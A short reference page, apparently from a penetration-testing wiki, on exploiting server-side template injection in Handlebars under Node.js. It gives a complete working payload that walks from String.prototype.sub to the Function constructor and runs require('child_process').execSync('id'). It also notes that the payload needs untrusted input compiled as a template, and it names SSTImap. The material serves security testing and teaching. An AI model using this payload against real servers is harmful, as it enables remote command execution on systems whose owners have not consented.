---
title: "Handlebars server-side template injection"
description: "Exploiting Handlebars SSTI in Node.js: using #with and the constructor.constructor walk to build a Function that calls require('child_process') for command execution."
keywords:
  - Handlebars SSTI
  - constructor.constructor
  - with helper
  - require child_process
---

# Handlebars

Handlebars is deliberately logic-light: it has no inline JavaScript and will not evaluate `{{7*7}}`, so detection relies on the engine's distinctive error output (for example malformed `{{` producing a "Parse error" referencing Handlebars) and on the `{{#if}}`/`{{#with}}` helper syntax being accepted. Despite the restrictions, server-side Handlebars is exploitable because the template can reach an object's `constructor.constructor`, which is JavaScript's `Function` constructor, and use it to compile arbitrary code.

The exploit uses `#with` to pin a reference, walks to `constructor.constructor`, and calls it with a function body that requires `child_process`:

```handlebars
{{#with "s" as |string|}}
  {{#with split as |conslist|}}
    {{this.pop}}
    {{this.push (lookup string.sub "constructor")}}
    {{this.pop}}
    {{#with string.split as |codelist|}}
      {{this.pop}}
      {{this.push "return require('child_process').execSync('id').toString();"}}
      {{this.pop}}
      {{#each conslist}}
        {{#with (string.sub.apply 0 codelist)}}
          {{this}}
        {{/with}}
      {{/each}}
    {{/with}}
  {{/with}}
{{/with}}
```

The chain reaches `String.prototype.sub`, pulls its `constructor` (the `Function` constructor), hands it the `return require('child_process')...` body, and applies it, so the command runs and its output is rendered. The payload is intricate because Handlebars offers no direct call syntax, but it is reliable against server-side Handlebars that renders attacker-controlled template source.

The practical precondition is that the untrusted input is compiled as a template (`Handlebars.compile(userInput)`), not merely passed as data to a fixed template; data context is escaped and safe. When only the data is attacker-controlled, Handlebars is not injectable this way. Confirm the compile-source sink before investing in the payload.

## Tools

- SSTImap

## References

- Handlebars documentation: helpers, compilation
- PortSwigger Web Security Academy: Server-side template injection
